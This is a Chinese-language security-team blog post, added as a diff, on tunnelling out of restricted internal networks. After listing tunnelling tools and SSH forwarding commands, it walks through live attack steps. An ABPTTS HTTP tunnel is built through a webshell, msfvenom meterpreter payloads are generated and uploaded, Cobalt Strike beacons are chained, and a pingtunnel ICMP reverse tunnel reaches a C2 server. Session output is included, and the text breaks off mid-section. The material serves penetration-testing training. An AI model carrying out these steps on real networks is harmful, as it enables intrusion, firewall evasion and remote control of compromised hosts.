@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>内网渗透之内网穿透 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 4.2.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">内网渗透之内网穿透</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/contact/"><i class="fa fa-comments"> 联系</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">内网渗透之内网穿透</h1><div class="post-meta">2020-06-17<span> | </span><span class="category"><a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> 阅读</span></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 4.4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 18</span><span class="post-meta-item-text"> 分钟</span></span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x0-前言"><span class="toc-number">1.</span> <span class="toc-text">0x0 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-内网穿透原理"><span class="toc-number">2.</span> <span class="toc-text">0x1 内网穿透原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-内网穿透常用工具"><span class="toc-number">3.</span> <span class="toc-text">0x2 内网穿透常用工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-1-网络层隧道工具"><span class="toc-number">3.1.</span> <span class="toc-text">0x2.1 网络层隧道工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-2-传输层隧道工具"><span class="toc-number">3.2.</span> <span class="toc-text">0x2.2 传输层隧道工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-3-应用层隧道工具"><span class="toc-number">3.3.</span> <span class="toc-text">0x2.3 应用层隧道工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-实战中的内网穿透案例"><span class="toc-number">4.</span> <span class="toc-text">0x3 实战中的内网穿透案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-1-上线零出网的内网主机"><span class="toc-number">4.1.</span> <span class="toc-text">0x3.1 上线零出网的内网主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方案设计"><span class="toc-number">4.1.1.</span> <span class="toc-text">方案设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-1-1-上线metasploit"><span class="toc-number">4.1.2.</span> <span class="toc-text">0x3.1.1 上线metasploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-1-2-上线cobaltstrike"><span class="toc-number">4.1.3.</span> <span class="toc-text">0x3.1.2 上线cobaltstrike</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-2-上线仅icmp协议出网的内网主机"><span class="toc-number">4.2.</span> <span class="toc-text">0x3.2 上线仅icmp协议出网的内网主机</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方案设计-1"><span class="toc-number">4.2.1.</span> <span class="toc-text">方案设计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-2-1-icmp隧道转发tcp上线metasploit"><span class="toc-number">4.2.2.</span> <span class="toc-text">0x3.2.1 icmp隧道转发tcp上线metasploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-2-2-icmp隧道转发socks上线metasploit"><span class="toc-number">4.2.3.</span> <span class="toc-text">0x3.2.2 icmp隧道转发socks上线metasploit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x3-2-3-icmp隧道转发tcp上线cobaltstrike"><span class="toc-number">4.2.4.</span> <span class="toc-text">0x3.2.3 icmp隧道转发tcp上线cobaltstrike</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-总结"><span class="toc-number">5.</span> <span class="toc-text">0x4 总结</span></a></li></ol></div></div><div class="post-content"><p><strong>Author:last0monster</strong></p>
+<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>网络上关于内网穿透的文章很多，但大部分都是侧重于工具的使用，原理提及较少。本文将从内网穿透的原理开始探讨，根据不同的内网出网入网情况，灵活设计对应的内网穿透方案。</p>
+<h2 id="0x1-内网穿透原理"><a href="#0x1-内网穿透原理" class="headerlink" title="0x1 内网穿透原理"></a>0x1 内网穿透原理</h2><p><strong>内网穿透是:利用各种隧道技术，以网络防火墙允许的协议，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</strong></p>
+<p>什么是隧道技术呢？我们看一下百科词条的解释</p>
+<blockquote>
+<p>隧道技术是一种通过使用互联网络的基础设施在网络之间传递数据的方式。使用隧道传递的数据(或负载)可以是不同协议的数据帧或包。隧道协议将这些其他协议的数据帧或包重新封装在新的包头中发送。新的包头提供了路由信息，从而使封装的负载数据能够通过互联网络传递。被封装的数据包在隧道的两个端点之间通过公共互联网络进行路由。被封装的数据包在公共互联网络上传递时所经过的逻辑路径称为隧道。一旦到达网络终点，数据将被解包并转发到最终目的地。注意隧道技术是指包括数据封装、传输和解包在内的全过程。</p>
+</blockquote>
+<p>我们进行内网渗透常用的隧道技术有dns隧道、http隧道、ssh隧道、icmp隧道等容易被网络防火墙放行的协议。</p>
+<p>这些隧道技术可以按所处的协议层分层。</p>
+<ul>
+<li>网络层隧道<blockquote>
+<p>ICMP隧道等</p>
+</blockquote>
+</li>
+<li>传输层隧道<blockquote>
+<p>TCP隧道、UDP隧道</p>
+</blockquote>
+</li>
+<li>应用层隧道<blockquote>
+<p>HTTP、DNS、SSH等隧道</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>内网主机所有可能的出网方式</strong></p>
+<ul>
+<li>允许ICMP协议出网<blockquote>
+<p>网络防火墙允许ICMP协议出网，即能ping通外网主机，一般都能出网</p>
+</blockquote>
+</li>
+<li>允许特定的TCP或UDP协议端口出网<blockquote>
+<p>网络防火墙允许特定的TCP或者UDP端口出网，比如连接外网的22、53、80、443、3389等常见应用的默认监听端口。在一个不能出网的网络环境里面，将所有的TCP和UPD端口都探测一遍，通常都能发现有一两个常见的端口能出网。这通常是由于网络管理员的错误配置和偷懒行为导致。比如配置的防火墙规则前后矛盾，解析的时候遇到匹配规则就退出执行；比如网络管理员配置允许web服务器访问另一子网的mysql数据库的3306端口。网络管理员配置时偷懒，可能会直接放行web服务器到任意ip地址的3306端口</p>
+</blockquote>
+</li>
+<li>允许特定的应用层协议出网（比如HTTP、SSH、DNS等应用层协议）<blockquote>
+<p>这种网络防火墙能识别应用层的协议，放行允许出网的协议，比如HTTP、SSH、DNS、RDP等应用层协议;通常办公网是允许HTTP协议出网的，可能会域名白名单限制</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>内网主机所有可能的入网方式</strong></p>
+<ul>
+<li><p>允许ICMP协议入网</p>
+<blockquote>
+<p>能ping通目标主机</p>
+</blockquote>
+</li>
+<li><p>允许特定的TCP或UDP协议端口入网</p>
+<blockquote>
+<p>NAT端口映射公网IP端口到内网主机的服务端口，比如将web服务、mysql服务NAT映射到公网</p>
+</blockquote>
+</li>
+<li><p>允许特定的应用层协议入网</p>
+<blockquote>
+<p>这种网络防火墙能识别应用层的协议，放行允许入网的协议。比如HTTP反向代理，将公网收到的HTTP流量反向代理进内网主机。当前主流的入网方式，通常会加层WAF审查入网流量</p>
+</blockquote>
+<h2 id="0x2-内网穿透常用工具"><a href="#0x2-内网穿透常用工具" class="headerlink" title="0x2 内网穿透常用工具"></a>0x2 内网穿透常用工具</h2><h3 id="0x2-1-网络层隧道工具"><a href="#0x2-1-网络层隧道工具" class="headerlink" title="0x2.1 网络层隧道工具"></a>0x2.1 网络层隧道工具</h3></li>
+<li><p><a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener">icmpsh</a></p>
+<blockquote>
+<p>能通过ICMP协议反弹cmd，功能单一，反弹回来的cmd极不稳定，不推荐使用</p>
+</blockquote>
+</li>
+<li><p><a href="https://github.com/DhavalKapil/icmptunnel" target="_blank" rel="noopener">icmptunnel</a></p>
+<blockquote>
+<p>创建虚拟网卡通过ICMP协议传输网卡流量，基于ICMP隧道的vpn，需要root权限，动静极大，不推荐使用</p>
+</blockquote>
+</li>
+<li><p><a href="https://github.com/esrrhs/pingtunnel" target="_blank" rel="noopener">pingtunnel</a></p>
+<blockquote>
+<p>tcp、udp、socks5 over ICMP，速度快，连接稳定，跨平台，client模式不需要管理员权限即可正常使用，推荐使用</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="0x2-2-传输层隧道工具"><a href="#0x2-2-传输层隧道工具" class="headerlink" title="0x2.2 传输层隧道工具"></a>0x2.2 传输层隧道工具</h3><ul>
+<li><a href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener">netcat</a><blockquote>
+<p>网络工具中的瑞士军刀，不多介绍，linux系统一般自带</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">powercat</a><blockquote>
+<p>powershell版的netcat</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/craSH/socat" target="_blank" rel="noopener">socat</a><blockquote>
+<p>具有记录转发流的功能，方便查看转发内容，需要安装</p>
+</blockquote>
+</li>
+<li>netsh<blockquote>
+<p>windows系统自带的网络配置工具</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/windworst/LCX" target="_blank" rel="noopener">lcx</a><blockquote>
+<p>端口转发工具</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/cw1997/NATBypass" target="_blank" rel="noopener">NATBypass</a><blockquote>
+<p>一款lcx在golang下的实现,更好的跨平台，更完善的文档</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/EddieIvan01/iox" target="_blank" rel="noopener">iox</a><blockquote>
+<p>端口转发 &amp; 内网代理工具，功能类似于lcx/ew，简化了命令行参数，支持UDP流量转发，更好的跨平台。缺点：不支持监听指定IP，默认监听0.0.0.0:port，会增大暴露风险</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="0x2-3-应用层隧道工具"><a href="#0x2-3-应用层隧道工具" class="headerlink" title="0x2.3 应用层隧道工具"></a>0x2.3 应用层隧道工具</h3><p>由于应用层协议极多，对应的隧道工具也很多，我们常用来做隧道的协议一般是DNS、HTTP、SSH、SOCKS等</p>
+<ul>
+<li><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2</a><blockquote>
+<p>不仅可以创建DNS隧道，更是C2</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">dnscat2-powershell</a><blockquote>
+<p>dnscat2的powershell客户端</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/alex-sector/dns2tcp" target="_blank" rel="noopener">dns2tcp</a><blockquote>
+<p>TCP over DNS,即通过DNS隧道转发TCP连接</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/yarrick/iodine" target="_blank" rel="noopener">iodine</a><blockquote>
+<p>IPv4 over DNS，即通过DNS隧道转发IPv4数据包</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a><blockquote>
+<p>SOCKS over HTTP,即通过HTTP隧道转发SOCKS</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">Neo-reGeorg</a><blockquote>
+<p>重构版reGeorg，提高稳定性和可用性，避免特征检测，更新活跃</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">reDuh</a><blockquote>
+<p>TCP over HTTP,即通过HTTP隧道转发TCP连接，隧道不稳定</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna</a><blockquote>
+<p>TCP、SOCKS over HTTP,即通过HTTP隧道转发TCP连接和SOCKS，隧道不稳定</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="noopener">ABPTTS</a><blockquote>
+<p>TCP over HTTP,即通过HTTP隧道转发TCP连接,数据加密，可自定义HTTP数据，对抗特征检测十分优秀，创建的隧道十分稳定，比较遗憾的是支持的web脚本类型只有aspx和jsp</p>
+</blockquote>
+</li>
+<li><a href="http://rootkiter.com/EarthWorm/" target="_blank" rel="noopener">EarthWorm</a><blockquote>
+<p>十分方便的多级SOCKS代理，已经永久停止更新</p>
+</blockquote>
+</li>
+<li><a href="http://rootkiter.com/Termite/" target="_blank" rel="noopener">Termite</a><blockquote>
+<p>EarthWorm的升级版，已经永久停止更新</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/Dliv3/Venom/" target="_blank" rel="noopener">Venom</a><blockquote>
+<p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具。</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/54Pany/sSocks" target="_blank" rel="noopener">ssocks</a><blockquote>
+<p>正向和反向的socks工具，可执行文件的大小很小</p>
+</blockquote>
+</li>
+<li><a href="https://github.com/ring04h/s5.go" target="_blank" rel="noopener">s5.go</a><blockquote>
+<p>go语言编写的socks服务工具，良好的跨平台特性</p>
+</blockquote>
+</li>
+<li>ssh<br>本地转发：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -L 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line">#ssh客户端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由服务端转发到114.114.114.114:9999</span><br></pre></td></tr></table></figure>
+远程转发：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -R 127.0.0.1:7777:114.114.114.114:9999 root@192.168.1.1</span><br><span class="line">#ssh服务端监听127.0.0.1:7777, 将收到的tcp数据包通过连接到192.168.1.1的ssh隧道转发到ssh客户端，再由ssh客户端转发到114.114.114.114:9999</span><br></pre></td></tr></table></figure>
+动态转发：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CNfg -D 127.0.0.1:7777 root@192.168.1.1</span><br><span class="line"># ssh客户端监听127.0.0.1:7777开启socks服务，将收到的socks数据包通过连接到192.168.1.1的ssh隧道转发到ssh服务端，再由ssh服务端转发到目标地址</span><br></pre></td></tr></table></figure>
+构建ssh隧道的常用参数:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输，提高传输速度</span><br><span class="line">-f 后台执行数据传输</span><br><span class="line">-N 建立静默连接</span><br><span class="line">-g 允许远程主机连接本地用于转发的端口</span><br><span class="line">-L 本地端口转发</span><br><span class="line">-R 远程端口转发</span><br><span class="line">-D 动态转发，即SOCKS代理</span><br><span class="line">-p 指定ssh连接端口</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x3-实战中的内网穿透案例"><a href="#0x3-实战中的内网穿透案例" class="headerlink" title="0x3 实战中的内网穿透案例"></a>0x3 实战中的内网穿透案例</h2><h3 id="0x3-1-上线零出网的内网主机"><a href="#0x3-1-上线零出网的内网主机" class="headerlink" title="0x3.1 上线零出网的内网主机"></a>0x3.1 上线零出网的内网主机</h3><p><strong>实战背景：</strong>获取了webshell的主机位于内网，并且该内网主机icmp等网络层协议不能出网，tcp和udp等传输层协议不能出网，dns、http等应用层协议也不能出网，唯一的数据通道是反向代理入网的web应用。</p>
+<h4 id="方案设计"><a href="#方案设计" class="headerlink" title="方案设计"></a>方案设计</h4><p>利用反向代理入网的web应用所在的HTTP连接，构建正向的<code>TCP over HTTP</code>隧道。通过这条隧道，我们可以向内网主机发起tcp连接。生成bind类型的payload，通过webshell上传执行就会监听一个端口，我们的远控平台通过构建的<code>TCP over HTTP</code>隧道，去连接监听的端口即可上线。</p>
+<p>能构建<code>TCP over HTTP</code>的隧道的工具有<code>ABPTTS、Tunna、reDuh</code>等，由于<code>Tunna、reDuh</code>构建的tcp连接不稳定，这里选用<code>ABPTTS</code>。</p>
+<h4 id="0x3-1-1-上线metasploit"><a href="#0x3-1-1-上线metasploit" class="headerlink" title="0x3.1.1 上线metasploit"></a>0x3.1.1 上线metasploit</h4><p>1.通过正向的http隧道构建tcp连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 配置abptts运行环境</span><br><span class="line"># 注意windows安装pycrypto库需要先安装依赖http:&#x2F;&#x2F;aka.ms&#x2F;vcpython27</span><br><span class="line">pip install httplib2</span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"># 生成server端脚本</span><br><span class="line">python abpttsfactory.py -o server</span><br><span class="line"></span><br><span class="line"># 上传server端脚本到web服务器，客户端运行以下命令</span><br><span class="line">python abpttsclient.py -c server&#x2F;config.txt -u &quot;http:&#x2F;&#x2F;192.168.168.10&#x2F;abptts.aspx&quot; -f 127.0.0.1:7777&#x2F;127.0.0.1:8888</span><br><span class="line"></span><br><span class="line"># abptts客户端监听127.0.0.1:7777，通过http:&#x2F;&#x2F;192.168.168.10&#x2F;abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888</span><br></pre></td></tr></table></figure>
+<p>2.生成bind类型的payload，通过webshell上传执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 这里的rhost和lport是转发的目的IP和端口</span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp rhost&#x3D;127.0.0.1 lport&#x3D;8888 -f exe -o meterpreter.exe</span><br></pre></td></tr></table></figure>
+<p>3.启动msf监听，等待meterpreter执行上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#这里的rhost和lport是abptts客户端监听的IP和端口，msf所在主机必须能访问到这个IP和端口，这里msf和abptts在同一个主机上</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set rhost 127.0.0.1</span><br><span class="line">rhost &#x3D;&gt; 127.0.0.1</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 7777</span><br><span class="line">lport &#x3D;&gt; 7777</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 127.0.0.1:7777</span><br><span class="line">[*] Sending stage (180291 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (0.0.0.0:0 -&gt; 127.0.0.1:7777) at 2020-04-27 04:50:25 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DESKTOP-0AH7FQ0\admin</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x3-1-2-上线cobaltstrike"><a href="#0x3-1-2-上线cobaltstrike" class="headerlink" title="0x3.1.2 上线cobaltstrike"></a>0x3.1.2 上线cobaltstrike</h4><p><strong>由于cobaltstrike的bind类型的监听器仅有beacon TCP和beacon SMB，并且都必须连接到父beacon，无法直接连接cobalstrike服务端，所以我们需要一个父beacon来中转连接。</strong></p>
+<p>1.通过正向的http隧道构建tcp连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 配置abptts运行环境</span><br><span class="line"># 注意windows安装pycrypto库需要先安装依赖http:&#x2F;&#x2F;aka.ms&#x2F;vcpython27</span><br><span class="line">pip install httplib2</span><br><span class="line">pip install pycrypto</span><br><span class="line"></span><br><span class="line"># 生成server端脚本</span><br><span class="line">python abpttsfactory.py -o server</span><br><span class="line"></span><br><span class="line"># 上传server端脚本到web服务器，客户端运行以下命令</span><br><span class="line">python abpttsclient.py -c server&#x2F;config.txt -u &quot;http:&#x2F;&#x2F;192.168.168.121&#x2F;abptts.aspx&quot; -f 127.0.0.1:7777&#x2F;127.0.0.1:8888</span><br><span class="line"></span><br><span class="line"># abptts客户端监听127.0.0.1:7777，通过http:&#x2F;&#x2F;192.168.168.121&#x2F;abptts.aspx这个http隧道，将tcp连接127.0.0.1:7777转发到web服务器网络下的127.0.0.1:8888</span><br></pre></td></tr></table></figure>
+<p>2.创建反向的listener</p>
+<div align="center">![Intranet-penetration/create_https_listener.png](Intranet-penetration/create_https_listener.png)</div>
+3.生成父beacon
+<div align="center">![Intranet-penetration/generate_https_beacon.png](Intranet-penetration/generate_https_beacon.png)</div>
+4.上传父beacon到abptts客户端执行上线
+<div align="center">![Intranet-penetration/initial_https_beacon.png](Intranet-penetration/initial_https_beacon.png)</div>
+5.创建payload为tcp beacon的listener
+<div align="center">![Intranet-penetration/create_tcp_listener.png](Intranet-penetration/create_tcp_listener.png)</div>
+6.生成stageless的子beacon
+<div align="center">![Intranet-penetration/generate_tcp_beacon.png](Intranet-penetration/generate_tcp_beacon.png)</div>
+7.将生成的子beacon通过webshell上传执行
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 可以通过webshell查看网络监听，确保子beacon执行成功</span><br><span class="line">netstat -ano | findstr 127.0.0.1:8888</span><br></pre></td></tr></table></figure>
+8.在父beacon中连接abptts的监听ip和端口
+<div align="center">![Intranet-penetration/connect_tcp_beacon.png](Intranet-penetration/connect_tcp_beacon.png)</div>
+9.成功上线不能出网的webshell内网主机
+<div align="center">![Intranet-penetration/initial_tcp_beacon.png](Intranet-penetration/initial_tcp_beacon.png)</div>
+
+<h3 id="0x3-2-上线仅icmp协议出网的内网主机"><a href="#0x3-2-上线仅icmp协议出网的内网主机" class="headerlink" title="0x3.2 上线仅icmp协议出网的内网主机"></a>0x3.2 上线仅icmp协议出网的内网主机</h3><p><strong>实战背景：</strong>通过某种信道获取了内网主机的shell，但是当前信道不适合做远控的通信信道（比如站库分离的网站，我们通过sql注入获取了数据库服务器的shell，但是数据库服务器只有icmp协议可以出网），tcp和udp等传输层协议不能出网，dns、http等应用层协议也不能出网，只有icmp协议可以出网。</p>
+<h4 id="方案设计-1"><a href="#方案设计-1" class="headerlink" title="方案设计"></a>方案设计</h4><p>icmp协议可以出网，可以利用icmp协议，构建反向的<code>TCP over ICMP</code>隧道或者<code>SOCKS over ICMP</code>隧道上线远控平台。搭建隧道的工具使用pingtunnel，它能通过icmp隧道转发tcp、udp、socks5连接。</p>
+<h4 id="0x3-2-1-icmp隧道转发tcp上线metasploit"><a href="#0x3-2-1-icmp隧道转发tcp上线metasploit" class="headerlink" title="0x3.2.1 icmp隧道转发tcp上线metasploit"></a>0x3.2.1 icmp隧道转发tcp上线metasploit</h4><p>1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;pingtunnel -type server -noprint 1 -nolog 1</span><br></pre></td></tr></table></figure>
+<p>2.ICMP隧道客户端（即需要通过ICMP隧道上线的主机）执行以下命令即可成功创建反向ICMP隧道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l 127.0.0.1:9999 -s icmpserver_ip -t c2_server_ip:7777 -tcp 1 -noprint 1 -nolog 1</span><br><span class="line"># 该命令的意思是icmp客户端监听127.0.0.1:9999，通过连接到icmpserver_ip的icmp隧道，将127.0.0.1:9999收到的tcp数据包转发到c2_server_ip:7777</span><br></pre></td></tr></table></figure>
+<p>3.生成反向payload的meterpreter并上传到ICMP隧道客户端执行即可上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https lhost&#x3D;127.0.0.1 lport&#x3D;9999 -f exe -o meterpreter.exe</span><br><span class="line"># 这里的lhost和lport为icmp客户端监听ip和端口</span><br></pre></td></tr></table></figure>
+<p>4.启动msf监听，等待meterpreter执行上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 这里的lhost和lport为icmp客户端转发到的ip和端口</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_https</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 0.0.0.0</span><br><span class="line">lhost &#x3D;&gt; 0.0.0.0</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 7777</span><br><span class="line">lport &#x3D;&gt; 7777</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started HTTPS reverse handler on https:&#x2F;&#x2F;0.0.0.0:7777</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DESKTOP-test0\admin</span><br></pre></td></tr></table></figure>
+<h4 id="0x3-2-2-icmp隧道转发socks上线metasploit"><a href="#0x3-2-2-icmp隧道转发socks上线metasploit" class="headerlink" title="0x3.2.2 icmp隧道转发socks上线metasploit"></a>0x3.2.2 icmp隧道转发socks上线metasploit</h4><p>1.准备好一个具有公网ip的服务器，root权限运行以下命令，启动ICMP隧道服务端</p>
